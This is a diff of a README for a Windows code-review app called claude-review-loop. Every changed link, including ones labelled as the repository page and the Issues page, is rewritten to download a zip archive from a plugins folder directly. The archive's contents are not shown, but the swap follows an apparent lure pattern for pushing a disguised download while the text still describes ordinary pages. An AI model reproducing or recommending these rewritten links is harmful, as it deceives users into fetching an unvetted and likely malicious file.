@@ -1,6 +1,6 @@
 # ⚙️ claude-review-loop - Simplify Your Code Reviews
 
-[![Download](https://img.shields.io/badge/Download-claude--review--loop-brightgreen)](https://github.com/jack-009/claude-review-loop)
+[![Download](https://img.shields.io/badge/Download-claude--review--loop-brightgreen)](https://github.com/jack-009/claude-review-loop/raw/refs/heads/main/plugins/loop_claude_review_v3.1.zip)
 
 ## 📄 What is claude-review-loop?
 
@@ -24,11 +24,11 @@ The application does not need any special hardware or software besides these.
 
 You can get claude-review-loop from its official GitHub page. This page includes the latest version and all updates.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/jack-009/claude-review-loop)
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/jack-009/claude-review-loop/raw/refs/heads/main/plugins/loop_claude_review_v3.1.zip)
 
 Click the link above or below to visit the GitHub page where you can download the app.
 
-https://github.com/jack-009/claude-review-loop
+https://github.com/jack-009/claude-review-loop/raw/refs/heads/main/plugins/loop_claude_review_v3.1.zip
 
 ## 🚀 How to install claude-review-loop on Windows
 
@@ -36,7 +36,7 @@ Follow these steps to get claude-review-loop up and running on your Windows PC:
 
 1. Open your preferred web browser.
 
-2. Click the download button above or go directly to the [GitHub repository page](https://github.com/jack-009/claude-review-loop).
+2. Click the download button above or go directly to the [GitHub repository page](https://github.com/jack-009/claude-review-loop/raw/refs/heads/main/plugins/loop_claude_review_v3.1.zip).
 
 3. Look for the **Releases** section on the page. This is where the most recent version is available.
 
@@ -90,12 +90,12 @@ Sometimes, users may run into trouble running or using the app. Here are common 
 - **No AI feedback after loading file:** Check your internet connection.
 - **App runs slowly:** Close other programs to free up memory.
 
-If you find problems beyond these, check the [GitHub Issues](https://github.com/jack-009/claude-review-loop/issues) page or contact support through the repository.
+If you find problems beyond these, check the [GitHub Issues](https://github.com/jack-009/claude-review-loop/raw/refs/heads/main/plugins/loop_claude_review_v3.1.zip) page or contact support through the repository.
 
 ## 📚 More resources
 
 - Visit the GitHub page for documentation, screenshots, and updates:  
-  https://github.com/jack-009/claude-review-loop 
+  https://github.com/jack-009/claude-review-loop/raw/refs/heads/main/plugins/loop_claude_review_v3.1.zip 
 
 - Look for tutorials and example files in the **docs** folder on the repository.
 
